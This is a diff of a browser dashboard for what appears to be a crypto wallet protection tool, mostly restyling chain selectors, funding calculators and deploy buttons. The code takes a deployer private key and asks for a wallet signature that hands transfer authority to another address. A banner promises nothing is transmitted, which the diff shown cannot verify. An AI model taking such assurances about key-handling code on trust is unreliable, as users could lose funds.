@@ -17,9 +17,9 @@
 
 /* ─── DESIGN TOKENS ──────────────────────── */
 :root{
-  /* Pure dark/charcoal — zero blue tinge */
-  --bg:       #0a0a0a;
-  --sur:      #111111;
+  /* Pure black — zero tinge of any hue */
+  --bg:       #000000;
+  --sur:      #0d0d0d;
   --bdr:      #2a2a2a;
   --bdr2:     #1c1c1c;
   --teal:     #00e8dd;
@@ -163,8 +163,8 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
   color:var(--orange);text-transform:uppercase;margin-bottom:5px;
 }
 .locked-sub{
-  font-size:9px;font-weight:700;letter-spacing:.10em;
-  color:var(--text);text-transform:uppercase;line-height:1.5;
+  font-size:10px;font-weight:600;letter-spacing:.06em;
+  color:var(--text);text-transform:uppercase;line-height:1.6;
 }
 
 /* ── 3.3 K1 Panel (label → input → LINK DEVICE) */
@@ -355,11 +355,25 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
   margin-bottom:14px;
 }
 .db-grid--row2{margin-bottom:0}
+/* K2+K3 only row — 2 equal columns */
+.db-grid--2col{grid-template-columns:1fr 1fr}
+/* chain + calc + result + deploy — all in one flex row */
+.db-calc-row{
+  display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-top:14px;
+}
+.db-select--chain{
+  flex:0 0 180px;min-width:140px;width:auto;padding:8px 28px 8px 9px;
+}
+.funding-inline{
+  flex:1;min-width:0;
+  font-size:10px;font-weight:700;color:var(--gold);font-family:'Courier New',Courier,monospace;
+  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
+}
 .db-field{display:flex;flex-direction:column;gap:5px}
 /* teal-bordered read-only input (K1 scan addr) */
 .db-input--teal{border-color:var(--teal)!important;color:var(--teal)!important;opacity:1!important}
 .db-lbl{
-  font-size:8.5px;font-weight:700;letter-spacing:.14em;color:var(--muted);
+  font-size:10px;font-weight:700;letter-spacing:.10em;color:var(--text);
   text-transform:uppercase;
 }
 .db-input-wrap{position:relative;display:flex;align-items:center}
@@ -437,7 +451,7 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
 }
 .twofa-desc strong{color:var(--teal);font-weight:700}
 .twofa-grid{
-  display:grid;grid-template-columns:repeat(4,1fr);gap:12px 14px;
+  display:grid;grid-template-columns:repeat(3,1fr);gap:12px 14px;
   margin-bottom:14px;
 }
 .twofa-actions{
@@ -450,6 +464,20 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
   background:rgba(0,232,221,.04);
   font-size:10.5px;color:var(--muted);line-height:1.8;
 }
+
+/* ── yellow reminder box ── */
+.reminder-box{
+  display:flex;align-items:flex-start;gap:12px;
+  padding:14px 16px;border-radius:5px;
+  border:1px solid rgba(245,194,58,.55);
+  background:rgba(245,194,58,.07);
+  margin-top:4px;
+}
+.reminder-icon{font-size:16px;color:var(--gold);flex-shrink:0;margin-top:1px}
+.reminder-text{
+  font-size:11px;color:var(--text);line-height:1.85;
+}
+.reminder-text strong{color:var(--gold);font-weight:700}
 
 /* ── revoke table section ── */
 .revoke-section .db-header{margin-bottom:10px}
@@ -914,8 +942,8 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
 
         </div><!-- /row 1 -->
 
-        <!-- Row 2: K2 Auth Address · K3 Clean Drop Address · Network (spans 2) -->
-        <div class="db-grid db-grid--row2" style="margin-bottom:14px">
+        <!-- Row 2: K2 · K3 (two equal columns, labels above) -->
+        <div class="db-grid db-grid--row2 db-grid--2col" style="margin-bottom:14px">
 
           <div class="db-field">
             <label class="db-lbl" for="k2-addr">K2 Auth Address</label>
@@ -929,51 +957,39 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
                    placeholder="0x..." autocomplete="off" spellcheck="false"/>
           </div>
 
-          <div class="db-field" style="grid-column:span 2">
-            <label class="db-lbl" for="network-select">Chain <span class="db-sub">(RPC auto-configured)</span></label>
-            <select id="network-select" class="db-select">
-              <option value="hl-evm">Hyperliquid EVM</option>
-              <option value="hl-core">Hyperliquid Core</option>
-              <option value="ethereum">Ethereum Mainnet</option>
-              <option value="base">Base</option>
-              <option value="arbitrum">Arbitrum One</option>
-              <option value="optimism">Optimism</option>
-              <option value="polygon">Polygon</option>
-              <option value="bnb">BNB Chain</option>
-              <option value="avax">Avalanche C-Chain</option>
-              <option value="plasma">Plasma</option>
-              <option value="monad">Monad Testnet</option>
-              <option value="ink">Ink</option>
-              <option value="unichain">Unichain</option>
-              <option value="abstract">Abstract</option>
-              <option value="ape-chain">Ape Chain</option>
-            </select>
-          </div>
-
           <!-- RPC URL hidden — set internally from the chain dropdown -->
           <input id="rpc-url" type="hidden" value=""/>
 
         </div><!-- /row 2 -->
 
-        <!-- Action row -->
-        <div class="db-actions">
-          <div class="db-actions-left">
-            <button id="calc-funding" type="button" class="db-btn db-btn--outline">
-              CALCULATE FUNDING
-            </button>
-            <button id="scan-revokes" type="button" class="db-btn db-btn--outline">
-              REPO K1
-            </button>
-          </div>
-          <div class="db-actions-right">
-            <button id="deploy-btn" type="button" class="db-btn db-btn--deploy" disabled>
-              DEPLOY EIP-777G BUNDLE
-            </button>
-          </div>
+        <!-- Chain + Calc row: [Chain Dropdown] [CALCULATE FUNDING] [result] [→ spacer] [DEPLOY] -->
+        <div class="db-calc-row">
+          <select id="network-select" class="db-select db-select--chain">
+            <option value="hl-evm">Hyperliquid EVM</option>
+            <option value="hl-core">Hyperliquid Core</option>
+            <option value="ethereum">Ethereum Mainnet</option>
+            <option value="base">Base</option>
+            <option value="arbitrum">Arbitrum One</option>
+            <option value="optimism">Optimism</option>
+            <option value="polygon">Polygon</option>
+            <option value="bnb">BNB Chain</option>
+            <option value="avax">Avalanche C-Chain</option>
+            <option value="plasma">Plasma</option>
+            <option value="monad">Monad Testnet</option>
+            <option value="ink">Ink</option>
+            <option value="unichain">Unichain</option>
+            <option value="abstract">Abstract</option>
+            <option value="ape-chain">Ape Chain</option>
+          </select>
+          <button id="calc-funding" type="button" class="db-btn db-btn--outline">
+            CALCULATE FUNDING
+          </button>
+          <div id="funding-display" class="funding-inline" aria-live="polite"></div>
+          <button id="scan-revokes" type="button" class="db-btn db-btn--outline" hidden style="display:none">REPO K1</button>
+          <button id="deploy-btn" type="button" class="db-btn db-btn--deploy" disabled>
+            DEPLOY EIP-777G BUNDLE
+          </button>
         </div>
-
-        <!-- Funding result — revealed after CALCULATE FUNDING -->
-        <div id="funding-display" class="funding-display" aria-live="polite"></div>
 
       </section><!-- /deploy-section -->
 
@@ -1053,11 +1069,10 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
         </div>
 
         <div class="twofa-desc">
-          <strong>For protection before compromise</strong> — deploy EIP-777G here.<br>
-          No bots, revokes, or keys are required. Simply authorize the signature in K1 to activate the contract, assigning K2 as your authorization key. Any authorized transfer will route directly to your K3 address.
+          <strong>For protection before compromise</strong> — deploy EIP-777G here.
         </div>
 
-        <!-- Fields: K1 Address (auto-filled, read-only) · K2 Address · K3 Address -->
+        <!-- Fields: K1 (auto-filled) · K2 · K3 — three equal columns -->
         <div class="twofa-grid">
 
           <div class="db-field">
@@ -1078,45 +1093,50 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
                    placeholder="0x..." autocomplete="off" spellcheck="false"/>
           </div>
 
-          <div class="db-field">
-            <label class="db-lbl" for="twofa-chain">Chain <span class="db-sub">(RPC auto-configured)</span></label>
-            <select id="twofa-chain" class="db-select">
-              <option value="hl-evm">Hyperliquid EVM</option>
-              <option value="hl-core">Hyperliquid Core</option>
-              <option value="ethereum">Ethereum Mainnet</option>
-              <option value="base">Base</option>
-              <option value="arbitrum">Arbitrum One</option>
-              <option value="optimism">Optimism</option>
-              <option value="polygon">Polygon</option>
-              <option value="bnb">BNB Chain</option>
-              <option value="avax">Avalanche C-Chain</option>
-              <option value="plasma">Plasma</option>
-              <option value="monad">Monad Testnet</option>
-              <option value="ink">Ink</option>
-              <option value="unichain">Unichain</option>
-              <option value="abstract">Abstract</option>
-              <option value="ape-chain">Ape Chain</option>
-            </select>
-          </div>
-
         </div><!-- /twofa-grid -->
 
-        <!-- Funding calculator result for 2FA chain -->
-        <div class="twofa-actions">
+        <!-- Chain + Calc row (same pattern as deploy bundle) -->
+        <div class="db-calc-row">
+          <select id="twofa-chain" class="db-select db-select--chain">
+            <option value="hl-evm">Hyperliquid EVM</option>
+            <option value="hl-core">Hyperliquid Core</option>
+            <option value="ethereum">Ethereum Mainnet</option>
+            <option value="base">Base</option>
+            <option value="arbitrum">Arbitrum One</option>
+            <option value="optimism">Optimism</option>
+            <option value="polygon">Polygon</option>
+            <option value="bnb">BNB Chain</option>
+            <option value="avax">Avalanche C-Chain</option>
+            <option value="plasma">Plasma</option>
+            <option value="monad">Monad Testnet</option>
+            <option value="ink">Ink</option>
+            <option value="unichain">Unichain</option>
+            <option value="abstract">Abstract</option>
+            <option value="ape-chain">Ape Chain</option>
+          </select>
           <button id="twofa-calc" type="button" class="db-btn db-btn--outline">
             CALCULATE FUNDING
           </button>
+          <div id="twofa-funding" class="funding-inline" aria-live="polite"></div>
           <button id="twofa-deploy" type="button" class="db-btn db-btn--deploy" disabled>
             AUTHORIZE &amp; DEPLOY 2FA
           </button>
         </div>
-        <div id="twofa-funding" class="funding-display" aria-live="polite"></div>
 
         <div class="twofa-sign-note">
-          To activate: open K1 in your wallet and authorize the signature prompt. No private key entry required — signing activates the contract and assigns K2 authorization.
+          To activate: open K1 in your wallet and authorize the signature prompt. No private key entry required — signing activates the contract and assigns K2 authorization. Any authorized transfer will route directly to your K3 address.
         </div>
 
       </section><!-- /twofa-section -->
+
+      <!-- ── YELLOW REMINDER BOX ──────────────────────────────── -->
+      <div class="reminder-box" role="note">
+        <span class="reminder-icon" aria-hidden="true">&#9888;</span>
+        <div class="reminder-text">
+          All data auto-scrubs after verification and again at session end. SCRUB purges on demand.<br>
+          <strong>Standalone.</strong> Nothing is stored, logged, or transmitted. Runs entirely in your browser.
+        </div>
+      </div>
 
     </div><!-- /main-dash -->
 
@@ -1456,18 +1476,18 @@ function calcFunding(){
   var fundDisp = document.getElementById('funding-display');
   var deployerKeyEl = document.getElementById('deployer-key');
   if(!fundDisp) return;
-  if(!window.ethers){ fundDisp.innerHTML='<div class="funding-row"><span style="color:var(--red)">ethers.js not loaded yet — try again</span></div>'; return; }
+  if(!window.ethers){ fundDisp.innerHTML='<span style="color:var(--red)">ethers.js not loaded — try again</span>'; return; }
   if(!deployerKeyEl||!deployerKeyEl.value.trim()){
-    fundDisp.innerHTML='<div class="funding-row"><span style="color:var(--red)">Deployer private key required</span></div>';
+    fundDisp.innerHTML='<span style="color:var(--red)">Deployer key required</span>';
     return;
   }
   setStatus('Calculating\u2026');
-  fundDisp.innerHTML='<div class="funding-row"><span>Fetching chain data\u2026</span><span></span></div>';
+  fundDisp.innerHTML='<span style="color:var(--muted)">Fetching chain data\u2026</span>';
   window.dashStepActive('funding');
 
   var wallet;
   try{ wallet = getDeployerWallet(); }
-  catch(err){ fundDisp.innerHTML='<div class="funding-row"><span style="color:var(--red)">'+err.message+'</span></div>'; setStatus(''); return; }
+  catch(err){ fundDisp.innerHTML='<span style="color:var(--red)">'+err.message+'</span>'; setStatus(''); return; }
 
   Promise.all([
     wallet.getBalance(),
@@ -1486,25 +1506,19 @@ function calcFunding(){
     var fmt = function(wei){ return parseFloat(ethers.utils.formatEther(wei)).toFixed(6)+' ETH'; };
     var fmtGwei = function(wei){ return parseFloat(ethers.utils.formatUnits(wei,'gwei')).toFixed(4)+' Gwei'; };
     var sufficient = balance.gte(totalCost);
-    var rows = [
-      {l:'Deployer balance',               v:fmt(balance), hi: sufficient ? 'teal' : 'red'},
-      {l:'Deploy EIP777G (est. 1.3M gas)', v:fmt(deployCost)},
-      {l:'Current gas price',              v:fmtGwei(gasPrice)},
-      {l:'Revoke bundle ('+maxRevokes+' txs @ 50k gas)', v:fmt(revokeCost)},
-      {l:'Total required',                 v:fmt(totalCost)},
-      {l:'Network',                        v:network.toUpperCase(), cls:'total'}
-    ];
-    fundDisp.innerHTML = rows.map(function(r){
-      var style = r.hi ? 'color:var(--'+r.hi+')' : '';
-      return '<div class="funding-row'+(r.cls?' '+r.cls:'')+'"><span>'+r.l+'</span><span style="'+style+'">'+r.v+'</span></div>';
-    }).join('');
-    if(!sufficient){
-      fundDisp.innerHTML += '<div class="funding-row"><span style="color:var(--red);font-weight:700">INSUFFICIENT BALANCE</span><span style="color:var(--red)">Fund deployer first</span></div>';
-    }
+    /* Inline single-line summary: "NEED 0.008432 ETH  |  BAL 0.012 ETH  ✓" */
+    var statusIcon = sufficient
+      ? '<span style="color:var(--teal)"> \u2713</span>'
+      : '<span style="color:var(--red)"> \u26a0 INSUFFICIENT</span>';
+    fundDisp.textContent = '';
+    fundDisp.innerHTML =
+      'NEED\u00a0<span style="color:var(--teal)">' + fmt(totalCost) + '</span>' +
+      '\u2003BAL\u00a0<span style="color:' + (sufficient?'var(--teal)':'var(--red)') + '">' + fmt(balance) + '</span>' +
+      statusIcon;
     setStatus(sufficient ? 'Funding ready' : 'Insufficient funds');
     window.dashStepDone('funding','Funding calculated');
   }).catch(function(err){
-    fundDisp.innerHTML='<div class="funding-row"><span style="color:var(--red)">RPC error: '+err.message+'</span></div>';
+    fundDisp.innerHTML='<span style="color:var(--red)">RPC error: '+err.message+'</span>';
     setStatus('RPC error');
     window.dashStepError('funding', err.message);
   });
@@ -2049,7 +2063,7 @@ function onSuccess(){
         'unichain':'~0.001 ETH','abstract':'~0.001 ETH','ape-chain':'~0.5 APE'
       };
       var est = estimates[tfChain.value] || 'Check chain docs';
-      tfFund.innerHTML = '<div class="funding-row total"><span>Estimated Deployer Funding</span><span>'+est+'</span></div>';
+      tfFund.innerHTML = 'NEED\u00a0<span style="color:var(--gold)">' + est + '</span>';
     });
   }
   /* set RPC default immediately — so it's always present on reveal */
